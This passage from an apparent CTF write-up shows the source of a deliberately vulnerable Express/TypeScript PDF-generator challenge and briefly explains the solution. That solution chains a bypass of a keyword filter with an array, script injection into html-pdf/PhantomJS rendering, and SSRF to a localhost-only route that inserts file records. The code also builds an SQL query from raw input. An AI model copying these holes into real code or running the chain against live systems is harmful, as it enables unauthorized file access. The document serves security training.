class="keyword">from</span> <span class="string">&#x27;path&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> crypto <span class="keyword">from</span> <span class="string">&#x27;crypto&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; promisify &#125; <span class="keyword">from</span> <span class="string">&#x27;util&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; v4 <span class="keyword">as</span> uuid  &#125; <span class="keyword">from</span> <span class="string">&#x27;uuid&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> readFile = <span class="title function_">promisify</span>(fs.<span class="property">readFile</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> getCheckSum = (<span class="attr">filename</span>: string): <span class="title class_">Promise</span>&lt;string&gt; =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> shasum = crypto.<span class="title function_">createHash</span>(<span class="string">&#x27;md5&#x27;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> s = fs.<span class="title function_">createReadStream</span>(path.<span class="title function_">join</span>(__dirname , <span class="string">&quot;../files/&quot;</span>, filename));</span><br><span class="line">            s.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">                shasum.<span class="title function_">update</span>(data)</span><br><span class="line">            &#125;)</span><br><span class="line">            s.<span class="title function_">on</span>(<span class="string">&#x27;end&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_">resolve</span>(shasum.<span class="title function_">digest</span>(<span class="string">&#x27;hex&#x27;</span>));</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">            <span class="title function_">reject</span>(err)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">checkAuth</span> = (<span class="params">req: Request, res:Response, next:NextFunction</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> token = req.<span class="property">signedCookies</span>[<span class="string">&#x27;token&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> (token &amp;&amp; token[<span class="string">&quot;username&quot;</span>]) &#123;</span><br><span class="line">        <span class="keyword">if</span> (token.<span class="property">username</span> === <span class="string">&#x27;superuser&#x27;</span>)&#123;</span><br><span class="line">            <span class="title function_">next</span>(<span class="title function_">createError</span>(<span class="number">404</span>)) <span class="comment">// superuser is disabled since you can&#x27;t even find it in database :)</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (token.<span class="property">isAdmin</span> === <span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="title function_">next</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_">next</span>(<span class="title function_">createError</span>(<span class="number">404</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">_, res</span>) =&gt;</span> res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123; <span class="attr">message</span>: <span class="string">`Only admin&#x27;s function is implemented. 😖 `</span>&#125;))</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> &#123; username, password &#125; = req.<span class="property">body</span>;</span><br><span class="line">    <span class="keyword">if</span> ( username &amp;&amp; password) &#123;</span><br><span class="line">        <span class="keyword">if</span> ( username == <span class="string">&#x27;&#x27;</span> || <span class="title function_">typeof</span>(username) !== <span class="string">&quot;string&quot;</span> || password == <span class="string">&#x27;&#x27;</span> || <span class="title function_">typeof</span>(password) !== <span class="string">&quot;string&quot;</span> ) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;Parameters error 👻&#x27;</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">let</span> data = <span class="keyword">await</span> <span class="variable constant_">DB</span>.<span class="title class_">Login</span>(username, password)</span><br><span class="line">        <span class="keyword">if</span>(!data) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123; error : <span class="string">&#x27;You are not admin 😤&#x27;</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        res.<span class="title function_">cookie</span>(<span class="string">&#x27;token&#x27;</span>, &#123;</span><br><span class="line">            <span class="attr">username</span>: username,</span><br><span class="line">            <span class="attr">isAdmin</span>: <span class="literal">true</span> </span><br><span class="line">        &#125;, &#123; <span class="attr">signed</span>: <span class="literal">true</span> &#125;)</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&#x27;/admin&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123; error : <span class="string">&#x27;Parameters cannot be blank 😒&#x27;</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/admin&#x27;</span>, checkAuth, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> token = req.<span class="property">signedCookies</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> files = <span class="keyword">await</span> <span class="variable constant_">DB</span>.<span class="title function_">listFile</span>(token.<span class="property">username</span>);</span><br><span class="line">        <span class="keyword">if</span> (files) &#123;</span><br><span class="line">            res.<span class="title function_">cookie</span>(<span class="string">&#x27;token&#x27;</span>, &#123;<span class="attr">username</span>: token.<span class="property">username</span>, <span class="attr">files</span>: files, <span class="attr">isAdmin</span>: <span class="literal">true</span> &#125;, &#123; <span class="attr">signed</span>: <span class="literal">true</span> &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;admin&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;Something wrong ... 👻&#x27;</span>&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;admin&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/admin&#x27;</span>, checkAuth, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> &#123; content &#125; = req.<span class="property">body</span>;</span><br><span class="line">    <span class="keyword">if</span> ( content == <span class="string">&#x27;&#x27;</span> || content.<span class="title function_">includes</span>(<span class="string">&#x27;&lt;&#x27;</span>) || content.<span class="title function_">includes</span>(<span class="string">&#x27;&gt;&#x27;</span>) || content.<span class="title function_">includes</span>(<span class="string">&#x27;/&#x27;</span>) || content.<span class="title function_">includes</span>(<span class="string">&#x27;script&#x27;</span>) || content.<span class="title function_">includes</span>(<span class="string">&#x27;on&#x27;</span>))&#123;</span><br><span class="line">        <span class="comment">// even admin can&#x27;t be trusted right ? :)  </span></span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;admin&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;Forbidden word 🤬&#x27;</span>&#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> template = <span class="string">`</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;meta charset=&quot;utf8&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;title&gt;Create your own pdfs&lt;/title&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;</span></span><br><span class="line"><span class="string">        &lt;h3&gt;<span class="subst">$&#123;content&#125;</span>&lt;/h3&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">        `</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> filename = <span class="string">`<span class="subst">$&#123;uuid()&#125;</span>.pdf`</span></span><br><span class="line">            pdf.<span class="title function_">create</span>(template, &#123;</span><br><span class="line">                <span class="string">&quot;format&quot;</span>: <span class="string">&quot;Letter&quot;</span>,</span><br><span class="line">                <span class="string">&quot;orientation&quot;</span>: <span class="string">&quot;portrait&quot;</span>,</span><br><span class="line">                <span class="string">&quot;border&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;pdf&quot;</span>,</span><br><span class="line">                <span class="string">&quot;renderDelay&quot;</span>: <span class="number">3000</span>,</span><br><span class="line">                <span class="string">&quot;timeout&quot;</span>: <span class="number">5000</span></span><br><span class="line">            &#125;).<span class="title function_">toFile</span>(<span class="string">`./files/<span class="subst">$&#123;filename&#125;</span>`</span>, <span class="keyword">async</span> (err, _) =&gt; &#123;</span><br><span class="line">                <span class="keyword">if</span> (err) <span class="title function_">next</span>(<span class="title function_">createError</span>(<span class="number">500</span>));</span><br><span class="line">                <span class="keyword">const</span> checksum = <span class="keyword">await</span> <span class="title function_">getCheckSum</span>(filename);</span><br><span class="line">                <span class="keyword">await</span> <span class="variable constant_">DB</span>.<span class="title class_">Create</span>(<span class="string">&#x27;superuser&#x27;</span>, filename, checksum)</span><br><span class="line">                <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;admin&#x27;</span>, &#123; message : <span class="string">`Your pdf is successfully saved 🤑 You know how to download it right?`</span>&#125;);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;admin&#x27;</span>, &#123; error : <span class="string">&#x27;Failed to generate pdf 😥&#x27;</span>&#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="comment">// You can also add file logs here!</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/api/files&#x27;</span>, <span class="keyword">async</span> (req, res, next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">socket</span>.<span class="property">remoteAddress</span>.<span class="title function_">replace</span>(<span class="regexp">/^.*:/</span>, <span class="string">&#x27;&#x27;</span>) != <span class="string">&#x27;127.0.0.1&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">next</span>(<span class="title function_">createError</span>(<span class="number">401</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> &#123; username , filename, checksum &#125; = req.<span class="property">query</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">typeof</span>(username) == <span class="string">&quot;string&quot;</span> &amp;&amp; <span class="title function_">typeof</span>(filename) == <span class="string">&quot;string&quot;</span> &amp;&amp; <span class="title function_">typeof</span>(checksum) == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">await</span> <span class="variable constant_">DB</span>.<span class="title class_">Create</span>(username, filename, checksum)</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&#x27;Done&#x27;</span>)</span><br><span class="line">        &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&#x27;Error!&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&#x27;Parameters error&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/api/files/:id&#x27;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> token = req.<span class="property">signedCookies</span>[<span class="string">&#x27;token&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> (token &amp;&amp; token[<span class="string">&#x27;username&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">if</span> (token.<span class="property">username</span> == <span class="string">&#x27;superuser&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&#x27;Superuser is disabled now&#x27;</span>);   </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> filename = <span class="keyword">await</span> <span class="variable constant_">DB</span>.<span class="title function_">getFile</span>(token.<span class="property">username</span>, req.<span class="property">params</span>.<span class="property">id</span>)</span><br><span class="line">            <span class="keyword">if</span> (fs.<span class="title function_">existsSync</span>(path.<span class="title function_">join</span>(__dirname , <span class="string">&quot;../files/&quot;</span>, filename)))&#123;</span><br><span class="line">                <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="keyword">await</span> <span class="title function_">readFile</span>(path.<span class="title function_">join</span>(__dirname , <span class="string">&quot;../files/&quot;</span>, filename)));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&#x27;No such file!&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&#x27;Error!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>app.ts</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> express <span class="keyword">from</span> <span class="string">&#x27;express&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;<span class="title class_">Request</span>, <span class="title class_">Response</span>, <span class="title class_">NextFunction</span>&#125; <span class="keyword">from</span> <span class="string">&#x27;express&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;<span class="title class_">HttpError</span>&#125; <span class="keyword">from</span> <span class="string">&#x27;http-errors&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> cookieParser <span class="keyword">from</span> <span class="string">&#x27;cookie-parser&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> bodyParser <span class="keyword">from</span> <span class="string">&#x27;body-parser&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> path <span class="keyword">from</span> <span class="string">&#x27;path&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> logger <span class="keyword">from</span> <span class="string">&#x27;morgan&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> router <span class="keyword">from</span> <span class="string">&#x27;./routes/index&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> createError <span class="keyword">from</span> <span class="string">&#x27;http-errors&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;views&#x27;</span>));</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;pug&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">logger</span>(<span class="string">&#x27;dev&#x27;</span>));</span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/static&#x27;</span>,express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname,<span class="string">&#x27;static&#x27;</span>)));</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>(<span class="string">&#x27;💣🏁😓🐋🍓&#x27;</span>));</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123;<span class="attr">extended</span>: <span class="literal">true</span>&#125;));</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/&#x27;</span>,router);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">_: Request, _res: Response, next: NextFunction</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">next</span>(<span class="title function_">createError</span>(<span class="number">404</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">err: HttpError, _: Request, res: Response, next: NextFunction</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (res.<span class="property">headersSent</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="title function_">next</span>(err);</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="property">locals</span>.<span class="property">message</span> = err.<span class="property">message</span>;</span><br><span class="line">    res.<span class="property">locals</span>.<span class="property">error</span> = err;</span><br><span class="line">    res.<span class="property">locals</span>.<span class="property">status</span> = (err.<span class="property">status</span> || <span class="number">500</span>)</span><br><span class="line">    res.<span class="title function_">status</span>(err.<span class="property">status</span> || <span class="number">500</span>);</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">8888</span>, <span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Listening at port 8888&#x27;</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>database.ts</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> sqlite3 <span class="keyword">from</span> <span class="string">&#x27;sqlite3&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> db = <span class="keyword">new</span> sqlite3.<span class="title class_">Database</span>(<span class="string">&#x27;./database.db&#x27;</span>, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(err.<span class="property">message</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Successfully Connected!&quot;</span>);</span><br><span class="line">        db.<span class="title function_">exec</span>(<span class="string">`</span></span><br><span class="line"><span class="string">        DROP TABLE IF EXISTS users;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	CREATE TABLE IF NOT EXISTS users (</span></span><br><span class="line"><span class="string">            id         INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,</span></span><br><span class="line"><span class="string">            username   VARCHAR(255) NOT NULL,</span></span><br><span class="line"><span class="string">            password   VARCHAR(255) NOT NULL</span></span><br><span class="line"><span class="string">        );</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	INSERT INTO users (id, username, password) VALUES (1, &#x27;admin&#x27;,&#x27;e365655e013ce7fdbdbf8f27b418c8fe6dc9354dc4c0328fa02b0ea547659645&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	DROP TABLE IF EXISTS files;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	CREATE TABLE IF NOT EXISTS files (</span></span><br><span class="line"><span class="string">            username   VARCHAR(255) NOT NULL,</span></span><br><span class="line"><span class="string">            filename   VARCHAR(255) NOT NULL UNIQUE,</span></span><br><span class="line"><span class="string">            checksum   VARCHAR(255) NOT NULL</span></span><br><span class="line"><span class="string">        );</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	INSERT INTO files (username, filename, checksum) VALUES (&#x27;superuser&#x27;,&#x27;flag&#x27;,&#x27;be5a14a8e504a66979f6938338b0662c&#x27;);`</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Init Finished!&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">class</span> <span class="title class_">DB</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="title class_">Login</span>(<span class="attr">username</span>: string, <span class="attr">password</span>: string): <span class="title class_">Promise</span>&lt;any&gt; &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">            db.<span class="title function_">get</span>(<span class="string">`SELECT * FROM users WHERE username = ? AND password = ?`</span>, username, password, <span class="function">(<span class="params">err , result </span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (err) <span class="keyword">return</span> <span class="title function_">reject</span>(err);</span><br><span class="line">                <span class="title function_">resolve</span>(result !== <span class="literal">undefined</span>);</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">static</span> <span class="title function_">getFile</span>(<span class="attr">username</span>: string, <span class="attr">checksum</span>: string): <span class="title class_">Promise</span>&lt;any&gt; &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">            db.<span class="title function_">get</span>(<span class="string">`SELECT filename FROM files WHERE username = ? AND checksum = ?`</span>, username, checksum, <span class="function">(<span class="params">err , result </span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (err) <span class="keyword">return</span> <span class="title function_">reject</span>(err);</span><br><span class="line">                <span class="title function_">resolve</span>(result ? result[<span class="string">&#x27;filename&#x27;</span>] : <span class="literal">null</span>);</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="title function_">listFile</span>(<span class="attr">username</span>: string): <span class="title class_">Promise</span>&lt;any&gt; &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">            db.<span class="title function_">all</span>(<span class="string">`SELECT filename, checksum FROM files WHERE username = ? ORDER BY filename`</span>, username, <span class="function">(<span class="params">err, result</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (err) <span class="keyword">return</span> <span class="title function_">reject</span>(err);</span><br><span class="line">                <span class="title function_">resolve</span>(result);</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="title class_">Create</span>(<span class="attr">username</span>: string, <span class="attr">filename</span>: string, <span class="attr">checksum</span>: string): <span class="title class_">Promise</span>&lt;any&gt; &#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">let</span> query = <span class="string">`INSERT INTO files(username, filename, checksum) VALUES(&#x27;<span class="subst">$&#123;username&#125;</span>&#x27;, &#x27;<span class="subst">$&#123;filename&#125;</span>&#x27;, &#x27;<span class="subst">$&#123;checksum&#125;</span>&#x27;);`</span>;</span><br><span class="line">                <span class="title function_">resolve</span>(db.<span class="title function_">run</span>(query));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">                <span class="title function_">reject</span>(err);</span><br><span class="line">            &#125;</span><br><span class="line">       &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>给3个ts文件，其中index.ts是路由文件，database.ts代表数据库处理，在里面有一个很迷惑的<code>$&#123;&#125;</code>让我一开始以为义眼丁真是sql注入。结果没他啥事情<br>看完了之后不难知道，我们需要读取files目录下的flag文件，但是flag是superuser用户的，我们是admin用户，如果我们是superuser，我们也读取不到，因为有一层判断。<br>因此我们需要做的事情是，通过<code>/api/files</code>路由，进行SSRF，给admin用户添加一个flag文件，然后我们就可以读取拉~<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685622599164-57c4da5f-6f0b-4ddc-b183-a76a7678ce65.png#averageHue=%2331302a&clientId=uab4b7e6d-cb7e-4&from=paste&height=45&id=u5203c0e7&originHeight=56&originWidth=430&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=37097&status=done&style=none&taskId=u32030fbc-c975-4b3f-aae8-6e54a4cfdbd&title=&width=344" alt="image.png"><br>tml-pdf 用到了phanthomjs渲染，因此存在ssrf漏洞，这边我们只需要让content里包含一个xss的代码，他就会去渲染，进而造成ssrf漏洞了。一个小tips<br>然后content里做了waf处理，但是可以用数组绕过。。。</p>
